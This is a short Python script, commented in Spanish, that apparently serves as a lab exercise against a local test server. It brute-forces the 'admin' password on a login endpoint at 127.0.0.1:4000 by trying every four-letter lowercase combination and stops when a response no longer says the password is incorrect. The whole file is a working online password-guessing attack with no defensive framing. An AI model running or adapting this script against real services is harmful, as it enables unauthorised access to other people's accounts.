import requests
import json
import itertools

#variables
Minusculas = 'abcdefghijklmnopqrstuvwxyz'
Mayusculas = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
Numeros = 123456789
#Especiales !"#$%&/()=?¡*_:,;.-'¿
#variables de coneccion
url = 'http://127.0.0.1:4000/agregar_contenido'
cabecera={'Content-Type': 'application/json'}
#generar contraseñas
longitud = 4
arreglodecaracteres = list(Minusculas)
#este es un array que contiene todas las combinaciones de contraseñas generadas para probar en la conexion
combinaciones = itertools.product(arreglodecaracteres , repeat=longitud)
#por cada combinacion se realiza una conexion donde password es igual a la combinacion
for combinacion in combinaciones:
    password = ''.join(combinacion)
    payload = {'user': 'admin' , 'pass': password}
    r = requests.post(url, data=json.dumps(payload),headers=cabecera, verify=False)
    respuesta = r.text
    if 'incorrecta' in respuesta:
        print('contraseña incorrecta: '+password)
    else:
        print('---------------------CONTRASEÑA ENCONTRADA-----------------------')
        print('La contraseña es: ' + password)
        break






